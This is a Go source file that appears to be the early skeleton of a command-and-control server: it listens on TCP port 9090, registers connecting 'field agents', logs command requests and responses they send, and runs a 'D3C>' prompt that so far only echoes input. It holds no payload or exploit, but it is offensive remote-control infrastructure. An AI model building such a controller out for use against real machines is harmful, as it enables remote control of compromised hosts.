package main

import (
	"bufio"
	"encoding/gob"
	"global"
	"log"
	"net"
	"os"
)

var (
	fieldAgents = []global.Message{}
)

func main() {
	log.Println("Execution started")

	go startListener("9090")

	cliHandler()
}

func cliHandler() {
	for {
		print("D3C> ")
		reader := bufio.NewReader(os.Stdin)
		completeCommand, _ := reader.ReadString('\n')
		println(completeCommand)
	}
}

func agentRegistration(agentID string) (registered bool) {
	registered = false

	for _, v := range fieldAgents {
		if v.AgentID == agentID {
			registered = true
		}
	}

	return registered
}

func commandResponse(message global.Message) (contains bool) {
	contains = false

	for _, v := range message.Commands {
		if len(v.Response) > 0 {
			contains = true
		}
	}

	return contains
}

func startListener(port string) {
	listener, err := net.Listen("tcp", "0.0.0.0:"+port)

	if err != nil {
		log.Fatal("Error starting listener: ", err.Error())
	} else {

		for {
			channel, e := listener.Accept()
			defer channel.Close()

			if e != nil {
				log.Println("Error on a new channel: ", e.Error())
			} else {
				message := &global.Message{}

				gob.NewDecoder(channel).Decode(message)

				// Agent registration verification
				if agentRegistration(message.AgentID) {
					log.Println("Agent Message: ", message.AgentID)
					if commandResponse(*message) {

						//Print response
						for _, v := range message.Commands {
							log.Println("Request: ", v.Request)
							log.Println("Response: ", v.Response)
						}
					}
				} else {
					log.Println("New connection: ", channel.RemoteAddr().String())
					fieldAgents = append(fieldAgents, *message)
				}

				//
				//
				//

				gob.NewEncoder(channel).Encode(message)
			}
		}
	}
}
